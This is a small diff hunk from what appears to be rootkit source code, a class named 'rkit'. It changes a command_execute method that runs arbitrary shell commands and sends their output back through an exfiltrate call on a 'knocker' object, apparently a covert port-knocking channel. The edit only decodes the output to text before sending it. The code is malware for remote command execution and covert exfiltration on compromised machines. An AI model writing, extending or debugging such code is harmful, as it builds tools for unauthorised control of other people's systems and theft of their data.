@@ -66,7 +66,7 @@ class rkit:
     def command_execute(self, command):
         try:
             out = subprocess.check_output(command, shell=True)
-            self.knocker.exfiltrate(out, "/")
+            self.knocker.exfiltrate(out.decode("utf-8"), "/")
         except subprocess.CalledProcessError as e:
             self.knocker.exfiltrate("Command "+command+" not found", "/")
 
